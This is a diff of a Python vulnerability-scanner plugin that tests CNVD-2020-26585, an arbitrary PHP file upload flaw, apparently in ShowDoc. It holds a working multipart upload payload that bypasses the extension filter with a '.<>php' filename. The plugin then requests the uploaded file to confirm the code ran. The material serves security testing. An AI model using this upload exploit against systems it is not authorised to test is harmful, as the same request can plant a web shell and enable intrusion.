@@ -1,73 +1,75 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
+from lib.tool.md5 import random_md5, random_num
 from lib.tool import check
-from thirdparty import requests
 import re
 
-def cnvd_2020_26585_scan(self, url):
+randomNum = random_num(24)
+randomStr_1 = random_md5()
+randomStr_2 = random_md5()
+
+cnvd_2020_26585_payloads = [
+    {
+        'path': 'index.php?s=/home/page/uploadImg',
+        'data': '----------------------------{NUM}\n'\
+                'Content-Disposition: form-data; name="editormd-image-file"; filename="{FILENAME}.<>php"\n'\
+                'Content-Type: text/plain\n'\
+                '\n'\
+                '<?php echo "{RCEMD}"?>\n'\
+                '----------------------------{NUM}--'.format(NUM=randomNum, FILENAME=randomStr_1, RCEMD=randomStr_2),
+        'headers': {'Content-Type': 'multipart/form-data; boundary=--------------------------{NUM}'.format(NUM=randomNum)}
+    }
+]
+
+def cnvd_2020_26585_scan(self, clients):
     ''' api_page存在任意文件上传 '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'FileUpload'
-    vul_info['vul_id'] = 'CNVD-2020-26585'
-    vul_info['vul_method'] = 'POST'
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'FileUpload',
+        'vul_id': 'CNVD-2020-26585',
+    }
 
-    for payload in range(len(self.cnvd_2020_26585_payloads)):
-        path = self.cnvd_2020_26585_payloads[payload]['path']
-        data = self.cnvd_2020_26585_payloads[payload]['data']
-        headers = self.cnvd_2020_26585_payloads[payload]['headers']
-        target = url + path
+    for payload in cnvd_2020_26585_payloads:
+        path = payload['path']
+        data = payload['data']
+        headers = payload['headers']
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['headers'] = headers
-        vul_info['target'] = target
+        res = client.request(
+            'post',
+            path,
+            data=data,
+            headers=headers,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
 
-        try:
-            res = requests.post(
-                target, 
-                timeout=self.timeout, 
-                headers=headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False,
-                allow_redirects=False
-            )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
+        file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
+        if (('"success":1' in res.text) and file_path):
+            file_path = file_path.group()                                     # * 提取返回的文件路径
+            file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url
 
-            file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
-            if (('"success":1' in res.text) and file_path):
-                file_path = file_path.group()                                     # * 提取返回的文件路径
-                file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url
-
-                res2 = requests.get(
-                file_path, 
-                timeout=self.timeout, 
+            res2 = client.request(
+                'get',
+                file_path,
+                allow_redirects=False,
+                vul_info=vul_info,
                 headers=self.headers,
-                proxies=self.proxies, 
-                verify=False,
-                allow_redirects=False
             )
-                logger.logging(vul_info, res2.status_code, res2)                        # * LOG
-            else:
-                return None
+            if res2 is None:
+                continue
 
-            if ('cnvd/2020/26585' in check.check_res(res2.text, 'cnvd/2020/26585')):
+            if (check.check_res(res2.text, randomStr_2)):
                 results = {
-                    'Target': target,
-                    'Verify': file_path,
+                    'Target': res.request.url,
+                    'Verify': res2.request.url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': res
+                    'Request-1': res,
+                    'Request-2': res2
                 }
                 return results
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+    return None
